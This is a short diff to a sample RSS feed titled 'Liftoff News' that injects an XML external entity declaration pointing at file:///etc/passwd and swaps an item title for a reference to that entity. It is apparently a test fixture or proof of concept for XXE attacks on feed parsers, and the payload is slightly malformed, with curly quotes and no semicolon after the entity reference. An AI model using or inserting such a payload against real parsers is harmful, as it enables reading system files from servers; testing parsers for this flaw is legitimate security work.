@@ -1,4 +1,5 @@
 <?xml version="1.0"?>
+<!DOCTYPE name [ <!ENTITY lol SYSTEM “file:///etc/passwd”>]>
 <rss version="2.0">
   <channel>
     <title>Liftoff News</title>
@@ -14,7 +15,7 @@
     <webMaster>webmaster@example.com</webMaster>
 
     <item>
-      <title>Star City</title>
+      <title>&lol</title>
       <link>http://liftoff.msfc.nasa.gov/news/2003/news-starcity.asp</link>
       <description>How do Americans get ready to work with Russians aboard the
         International Space Station? They take a crash course in culture, language
